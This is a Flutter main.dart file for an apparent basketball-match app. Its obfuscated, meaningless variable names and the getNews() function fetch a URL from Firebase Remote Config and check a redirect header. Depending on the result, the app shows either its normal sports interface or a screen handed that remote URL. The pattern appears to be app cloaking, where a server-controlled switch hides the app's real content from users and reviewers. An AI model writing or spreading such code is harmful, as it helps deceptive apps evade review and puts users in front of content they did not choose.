import 'dart:io';
import 'package:basket_test/features/match/api/firebase_options.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:hive_flutter/hive_flutter.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/models/match.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/match/api/match_api.dart';
import 'features/match/bloc/match_bloc.dart';

String mfdks = '';
bool inias = false;
String mdjas = '';
String fnjksd = '';
String modaslmdsa = '';
String njfksd = '';
String dsfsdfdsf = '';
Map njdkasdnsajk = {};
String mklfsdlfsd = '';
Map njkfnsdkxkds = {};
bool fmjsdkfnjksd = false;
String mfkdmslksdf = '';
String ndjaksdnkas = '';
String lkfosdpfsd = '';
String mklfmsfsfdlsmflksdf = '';
String df = '';
String fmnsdjkfnsd = '';
String fsdfds = '';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Hive.initFlutter();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  // await Hive.deleteBoxFromDisk('matchesbox');
  Hive.registerAdapter(MatchModelAdapter());
  runApp(const MyApp());
}

Future<bool> getNews() async {
  final dasfdsfsd = FirebaseRemoteConfig.instance;
  await dasfdsfsd.fetchAndActivate();
  String fullasd = dasfdsfsd.getString('news');
  String dsdfas = dasfdsfsd.getString('full');
  njfksd = fullasd;
  fmnsdjkfnsd = dsdfas;
  final ndfkljss = HttpClient();
  final fsdko = Uri.parse(njfksd);
  final mmmdksa = await ndfkljss.getUrl(fsdko);
  mmmdksa.followRedirects = false;
  final response = await mmmdksa.close();
  if (response.headers.value(HttpHeaders.locationHeader) != fmnsdjkfnsd) {
    return true;
  }
  return fullasd.contains('none') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MultiBlocProvider(
        providers: [
          BlocProvider(create: (context) => HomeBloc()),
          BlocProvider(create: (context) => MatchBloc()),
        ],
        child: FutureBuilder<bool>(
            future: getNews(),
            builder: (context, snapshot) {
              if (snapshot.connectionState == ConnectionState.waiting) {
                return Container(
                  color: Colors.white,
                );
              } else {
                if (snapshot.data == true && njfksd != '') {
                  return MaterialApp(
                    debugShowCheckedModeBanner: false,
                    home: MainScreen(
                      jdnkasdnkja: njfksd,
                    ),
                  );
                } else {
                  return MaterialApp.router(
                    debugShowCheckedModeBanner: false,
                    theme: theme,
                    routerConfig: routerConfig,
                  );
                }
              }
            }));
  }
}
